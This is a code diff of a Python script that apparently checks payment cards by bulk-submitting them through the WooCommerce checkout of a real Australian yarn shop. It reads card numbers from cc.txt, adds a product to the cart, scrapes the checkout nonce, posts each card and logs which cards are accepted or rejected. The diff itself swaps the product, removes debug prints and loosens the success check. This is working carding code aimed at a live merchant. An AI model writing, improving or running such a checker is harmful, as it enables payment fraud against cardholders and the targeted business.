@@ -59,9 +59,9 @@ def Tele(ccx):
     }
     params = {'wc-ajax': 'add_to_cart'}
     data = {
-        'success_message': '“1 x Wood Buttons Large 6cm 4 hole Coffee” has been added to your cart',
-        'product_sku': 'DB-B671168',
-        'product_id': '38290',
+        'success_message': '“1 x Wood Buttons Large 6cm 4 hole Dark Red Brown” has been added to your cart',
+        'product_sku': 'DB-B656908',
+        'product_id': '38286',
         'quantity': '1',
     }
     response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
@@ -84,9 +84,6 @@ def Tele(ccx):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
     }
     response = session.get('https://yarnclub.com.au/checkout/',headers=headers)
-    print(jar)
-    with open("a.txt", "w")as f:
-        f.write(response.text)
     match = re.search(r'id="woocommerce-process-checkout-nonce".*?value="(.*?)"', response.text)
     if match:
         nonce = match.group(1)
@@ -249,7 +246,7 @@ def Tele(ccx):
     response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
     # jar.update(response.cookies)
 
-    if {"result": "success"} in response.text:
+    if "success" in response.text:
         print(Fore.GREEN + f"{ccx} {response.text}")
     elif "incorrect." in response.text:
         print(Fore.GREEN + f"{ccx} The card number is incorrect.")
@@ -261,8 +258,6 @@ def Tele(ccx):
         print(Fore.GREEN + f"{ccx}{response.text}")
         with open("q.txt","a+")as f:
             f.write(f"{ccx}{response.text}\n\n")
-    print(jar)
-from concurrent.futures import ThreadPoolExecutor
 try:
     with open("cc.txt", "r") as f:
         lines = f.readlines()
